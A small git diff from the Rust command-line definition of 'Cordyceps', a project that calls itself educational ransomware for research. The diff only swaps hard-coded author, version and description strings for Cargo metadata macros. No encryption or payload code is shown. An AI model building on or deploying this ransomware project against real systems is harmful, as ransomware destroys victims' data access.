@@ -13,9 +13,9 @@ use crate::fsutils::{disinfect, sporulate};
 /// Command-line arguments
 #[derive(Parser, Debug)]
 #[command(
-    author = "Joe Lopes <lopes.id>",
-    version = "0.4.0",
-    about = "Rust ransomware, for learning not looting",
+    author = env!("CARGO_PKG_AUTHORS"),
+    version = env!("CARGO_PKG_VERSION"),
+    about = env!("CARGO_PKG_DESCRIPTION"),
     long_about = "Cordyceps is an educational ransomware designed for academic and research purposes."
 )]
 enum Cli {
